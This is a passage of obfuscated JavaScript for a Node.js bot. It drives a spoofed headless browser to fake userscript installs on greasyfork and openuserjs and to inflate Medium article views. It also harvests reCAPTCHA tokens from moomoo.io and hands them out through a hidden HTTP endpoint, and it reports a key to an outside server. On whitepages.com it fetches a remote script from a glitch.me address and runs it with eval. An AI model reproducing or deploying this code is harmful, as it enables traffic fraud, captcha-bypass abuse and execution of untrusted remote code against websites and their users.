      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + Y(0xb) + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + Z(0x0) + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + a0(0x10, '^Hqq') + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + Y(0x5) + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + Y(0x1e) + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    Z(0x14) + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + a0(0x6, 'aYhP'),
    'https://me' + 'dium.com/@' + Z(0x2) + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + a0(0x9, '&F]^') + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + Y(0x7) + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    Y(0x20) + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0xe2 * 0x25 + -0x1 * -0x4bd + 0x1bed
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x1d71 + 0x2 * -0x1245 + 0x719)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x13 * 0x31 + -0x25bd + 0x29c4), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x1110 + 0x17c2 * -0x1 + -0xd3 * -0x32), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x1fbb * -0x1 + 0xad1 + -0x14ea * -0x1;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0xf1 + 0x1249 + -0x1158; w < getRandomInt(-0xd8f * 0x2 + 0x100e + 0xb11, -0x1334 * -0x1 + -0xc8 + 0x1 * -0x1267); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x2 * 0x934c + 0x2f * 0x599 + 0x1 * 0x109e1);
        }
      }();
    }, -0x115b + 0x1 * -0x70f + 0x18ce), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      const a2 = c;

      function u() {
        const a1 = d;
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })[a1(0x8)](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x581 * 0x1 + 0x24d5 + -0x1 * 0x2a56;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y[a2(0x1b)]('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x1c * 0x40 + -0x12f9 * -0x1 + -0x19f9, 0x5 * -0x127 + -0xfdc + 0x15d1)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x4 * 0x1604 + 0x6b * -0xa7 + 0x62ed);
    }, -0x3 * 0x5d5 + -0x16cf + 0x28b2), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x2097 + -0x469 + 0x2500;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x2323 + -0xfc1 * -0x2 + -0x36ed), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x18 * 0x68 + -0xa91 + 0x1 * 0x1451), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x175d99 + 0xb30bf + -0x14d2b8);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x1901 + -0x16c1 + -0x2 * -0x1813);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x1257 + 0x1 * -0x197e + 0x7ef);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0xb * 0x4bd + -0x349 * 0x13 + 0x1 * 0x921a);
}
doFlags['doOUJS'] && ((async () => {
  const a4 = c;
  async function f() {
    const a3 = c,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x1 * -0x1af7 + 0x1 * 0x832 + 0x12c6) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x18 * 0xc2 + 0x2503 + 0x1266 * -0x3));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x9e0 + 0x203e + -0x6 * 0x705, D['indexOf']('\x20'));
        return B ? E['slice'](0x2 * 0x1138 + 0x22ab + -0x451b, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x2 * -0xaa1 + 0x13 * 0x4 + 0x1182),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x39a2 + -0x3697 + 0x9749 * 0x1),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + a3(0xe) + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + a4(0x15) + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + a4(0x13) + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
